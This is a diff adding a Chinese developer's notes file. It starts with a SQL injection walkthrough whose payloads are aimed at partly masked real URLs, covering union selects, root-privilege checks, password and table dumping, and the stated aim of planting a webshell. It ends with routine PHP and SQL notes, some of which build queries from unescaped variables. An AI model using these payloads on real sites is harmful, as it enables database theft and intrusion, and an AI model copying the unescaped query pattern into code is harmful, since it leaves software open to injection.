@@ -1,0 +1,174 @@
+http://netsecurity.51cto.com/art/201303/386717.htm
+Discuz防注入函数绕过方法分析
+
+
+
+PHP的SQL注入过程分析 (工具)
+http://www.jb51.net/article/29351.htm
+重要步骤：
+*批量扫描注入点
+*sql注入
+*数据库探测并提权
+*找后台
+*插入一句话木马
+*服务器 命令
+
+1找到注入点and1=1 -1 -0 %2Bsb
+http://XXX.it.sohu.com/book/serialize.php?id=86 and 1=1/*
+http://XXX.it.sohu.com/book/serialize.php?id=86 and 1=2/* 
+2查看mysql版本 4.0以上支持union
+http://XXX.it.sohu.com/book/serialize.php?id=86 and ord(mid(version(),1,1))>51/* 
+3查询表字段数http://XXX.it.sohu.com/book/serialize.php?id=86 order by 10/*    20 30  41
+4精确判断字段数
+http://XXX.it.sohu.com/book/serialize.php?id=86 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41/* 
+5数据库系统探测
+http://XXX.it.sohu.com/book/serialize.php?id=86 and 1=2 union select 1,user(),3,4,database(),6,7,8,9,10,version(),12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41/*
+6查看用户权限是否是root
+http://XXX.it.sohu.com/book/serialize.php?id=86 and (select count(*) from mysql.user)>0/* 
+7如果不是root权限猜用户表名
+http://XXX.it.sohu.com/book/serialize.php?id=86 and 1=2 union select 1,user(),3,4,database(),6,7,8,9,10,version(),12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41 from admin/*   user
+8猜字段名
+http://XXX.it.sohu.com/book/serialize.php?id=86 and 1=2 union select 1,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41 from user/* 
+9服务器命令测试
+
+http://www.rising.com.cn/newsletter/news/2012-05-24/11580.html
+如果是root权限
+暴表名
+http://www.a.com/cms/new.php?id=0 union select 1,2,table_name,4,5,6 from information_schema.tables where table_schema=0x636D73 limit 0,1
+
+
+jquery获取当前元素在同辈元素中的索引号实例
+$(this).index();
+
+jquery-timepicker-addon 时分秒插件
+
+百度云加速、cdn加速
+好玩模块
+
+
+2014-12-02
+2014-12-05
+https://medialoot.com/
+http://www.oschina.net/code/snippet_230665_21329
+html5
+源码：http://www.yxsss.com/sg.php?fp=0&tag=websocket
+demo：http://www.yxsss.com/ui/sk.html
+
+
+Bootstrap模板
+web-proxyhk.oa.com
+id号：
+4947190
+	
+
+查看程序执行时间
+<?php
+//开始begin
+list($usec, $sec) = explode(" ", microtime());
+$begin_time =  ((float)$usec + (float)$sec);
+echo $begin_time;
+//开始end
+?>
+
+js查看数据类型
+var type = Object.prototype.toString.call(data);
+
+		//事务开始
+		$this->transaction_begin();
+		$errno = 0;
+		
+		//删除详情
+		$this->set_table( "@#@order_detail" );
+		$return = $this->delete_ex( "od_id in ({$str_id})" );
+		$errno += mysql_errno();
+		
+		//重新计算总价
+		$o_totalprice = $this->get_totalprice_by_id( $order_id );
+		$errno += mysql_errno();
+		
+		//更新order表
+		$this->set_table( "@#@order" );
+		$this->update( array( "o_totalprice" => "$o_totalprice" ), "o_id=$order_id" );
+		$errno += mysql_errno();
+		
+		//事务回滚
+		if( $errno ){
+		    $this->transaction_rollback();
+	    	$return['err_msg'] = mysql_error();
+		    $return['ack'] = 0;
+		    return $return;
+		} else {
+			$this->transaction_commit();
+			$return['ack'] = 1;
+			//记录日志
+			$cls_log = cls_app:: get_cls( 'log' );
+			$cls_log->set_collection( 'log_order' );
+			$cls_log->add_log( array( 'log_order_id'=> $order_id, 'log_order_user'=> $admin_u, 			'log_order_time'=> time(), 'log_order_operation'=> "删除了$str_id详情记录，总价格由			$old_totalprice改为$o_totalprice" ) );
+		}
+		return $return;
+
+SELECT sum( (`od_price`+ifnull(`od_shipfee`,0)) * `od_num` ) FROM `v2_order_detail` WHERE `od_o_id` =12158 
+
+订单拆分： 
+手工拆分:新页面-》根据选好的detail合并-》选中拆分   ===>拆分之后根据原订单进入新列表页面
+自动拆分-》自动拆分                                 ===>拆分之后根据原订单进入新列表页面
+一个订单，一种发货方式，多个detail==========根据多个detail和一个重量限制拆分成多个小订单。
+
+订单合并：
+手工合并-》js先判断2kg超重->合并-再将超重状态保存   ==》进入新订单页面
+自动合并-》先合并-再将超重状态保存                 
+  
+多个订单，多个detail==========根据多个detail合并成一个订单
+
+
+
+
+SELECT *,count(*) FROM `v2_order_detail` od,`v2_products` p WHERE `od_product_id`>0 and od.od_product_id=p.product_id group by `od_o_id` having count(*)>2 ORDER BY `p`.`product_grossweight` DESC 
+
+SELECT *,count(*) FROM `v2_order` WHERE 1 group by `o_user_name`,`o_account` having count(*)>1;
+SELECT *,count(*) FROM `v2_order` WHERE 1 group by `o_user_name`,`o_account`,`o_street`,`o_city`,`o_state`,`o_country`, `o_street_1` having count(*)>1;
+
+SELECT * FROM `v2_order` WHERE o_id in (9258,9257,9256,9255,9254,9253,9252,9251,9250,9249,9248,9247,9246,9245,9244,9243,9242,9241,9240,9239,9238,9237,9236,9235,9234,9233,9232,9231,9230,9229,9228,9227,9226,9225,9224,9223,9222,9221,9220)
+
+
+
+
+杜十娘
+100块都不给我
+
+备忘录
+1删除产品之后->删除关联表数据（任务/程序/存储过程）
+2删除详细采购单之后检查订单下还有没有产品，没有就删除（任务/程序/存储过程）
+
+
+
+
+$cls_product = cls_app:: get_cls( 'product' );
+
+$cls_ta = cls_app:: get_d( '@#@ta' )
+
+echo $cls->get_last_sql();
+
+
+//explain 调试代码
+$sql = "explain ".$cls_product->get_last_sql();
+$explain = $cls_product->execute($sql);
+echo $cls_product->get_last_sql();
+var_dump($explain);
+
+
+//展开
+
+select * from v2_purchase_order_detail pod 
+join v2_products p  on pod.pod_num=p.product_id /* 用product_id测试 */
+join v2_products_addtion pa on pod.pod_sku = pa.pa_sku 
+left join v2_product_inventory pi on pod.pod_sku = pi.pi_sku 
+join v2_purchase_order po on pod.pod_sn = po.po_sn 
+left join v2_supplier su on pod.pod_supplier=su.su_id join v2_user u on po.po_caigou=u.user_id where pod_sn='郭朝妹14149853224'
+
+select * from v2_purchase_order_detail pod 
+join v2_products p  on pod.pod_sku=p.product_sku /* 原有语句用sku查询*/
+join v2_products_addtion pa on pod.pod_sku = pa.pa_sku 
+left join v2_product_inventory pi on pod.pod_sku = pi.pi_sku 
+join v2_purchase_order po on pod.pod_sn = po.po_sn 
+left join v2_supplier su on pod.pod_supplier=su.su_id join v2_user u on po.po_caigou=u.user_id where pod_sn='郭朝妹14149853224'
